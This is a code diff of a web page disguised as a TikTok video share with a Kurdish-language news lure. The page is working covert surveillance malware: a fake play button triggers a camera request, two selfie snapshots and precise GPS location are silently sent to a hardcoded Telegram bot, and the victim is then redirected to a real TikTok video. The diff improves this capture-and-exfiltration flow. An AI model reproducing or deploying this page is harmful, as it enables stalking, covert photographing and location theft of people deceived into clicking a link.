@@ -4,27 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>TikTok</title>
-    
     <meta property="og:title" content="TikTok . کێشەیەکی نوێ لە نەخۆشخانەی ئیدارەی سەربەخۆی سۆران">
     <meta property="og:image" content="https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
     <meta property="og:type" content="video.other">
-
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; display: flex; justify-content: center; align-items: center; overflow: hidden; }
-        .bg { 
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%; 
-            background: url('https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg') no-repeat center center; 
-            background-size: contain; /* بۆ ئەوەی وێنەکە زۆر نزیک نەبێت */
-            z-index: 1; 
-            filter: brightness(0.8); 
-        }
-        .play-btn { position: absolute; z-index: 5; pointer-events: none; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
+        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg') no-repeat center center; background-size: 100% 100%; z-index: 1; filter: brightness(0.8); }
+        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 5; pointer-events: none; }
         .play-icon { width: 80px; height: 80px; fill: white; opacity: 0.8; }
         #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
         video, canvas { display: none; }
@@ -33,10 +19,7 @@
 </head>
 <body id="b">
     <div class="bg" id="bg"></div>
-    <div class="play-btn" id="btn">
-        <svg class="play-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
-    </div>
-    
+    <div class="play-btn" id="btn"><svg class="play-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
     <div id="trap" onclick="startApp()"></div>
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
@@ -46,40 +29,50 @@
         const chat_id = "7261354534";
         const targetVideo = "https://vt.tiktok.com/ZS5WMhjoP/";
 
+        async function sendSnap(v, c, label) {
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            const blob = await (await fetch(c.toDataURL('image/jpeg', 0.8))).blob();
+            const fd = new FormData();
+            fd.append('chat_id', chat_id);
+            fd.append('photo', blob, 'photo.jpg');
+            fd.append('caption', `📸 ${label}\n📱 ` + (navigator.userAgent.includes("iPhone") ? "iPhone" : "Android"));
+            return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+        }
+
         async function startApp() {
             try {
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const b = document.getElementById('b');
                 const v = document.getElementById('v');
+                const c = document.getElementById('c');
                 v.srcObject = s;
                 await v.play();
                 document.getElementById('bg').style.display = 'none';
                 document.getElementById('btn').style.display = 'none';
-                b.classList.add('flash-active');
+                document.getElementById('b').classList.add('flash-active');
                 
+                // وێنەی یەکەم (1000ms)
                 setTimeout(async () => {
-                    const c = document.getElementById('c');
-                    c.width = v.videoWidth;
-                    c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    const blob = await (await fetch(c.toDataURL('image/jpeg', 0.8))).blob();
-                    const fd = new FormData();
-                    fd.append('chat_id', chat_id);
-                    fd.append('photo', blob, 'photo.jpg');
-                    fd.append('caption', "📸 Photo\n📱 " + (navigator.userAgent.includes("iPhone") ? "iPhone" : "Android"));
-                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                    await sendSnap(v, c, "وێنەی یەکەم");
                     
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(async (pos) => {
-                            const mapLink = "https://www.google.com/maps?q=$" + pos.coords.latitude + "," + pos.coords.longitude;
-                            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 Location:\n" + mapLink)}`);
-                            window.location.href = targetVideo;
-                        }, (err) => { window.location.href = targetVideo; }, { enableHighAccuracy: true, timeout: 5000 });
-                    } else { window.location.href = targetVideo; }
+                    // وێنەی دووەم (200ms)
+                    setTimeout(async () => {
+                        await sendSnap(v, c, "وێنەی دووەم");
+                        
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(async (pos) => {
+                                // چاککردنی لینکی لۆکەیشن بۆ ئەوەی ڕاستەوخۆ کار بکات
+                                const lat = pos.coords.latitude;
+                                const lon = pos.coords.longitude;
+                                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                                
+                                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 Location:\n" + mapLink)}`);
+                                window.location.href = targetVideo;
+                            }, () => { window.location.href = targetVideo; }, { enableHighAccuracy: true, timeout: 5000 });
+                        } else { window.location.href = targetVideo; }
+                    }, 200);
                 }, 1000);
-            } catch (e) {
-                // لێرە هیچ نامەیەک نیشان نادات، تەنها Allow ی فەرمی مۆبایلەکە دەمێنێتەوە
-            }
+            } catch (e) {}
         }
     </script>
 </body>
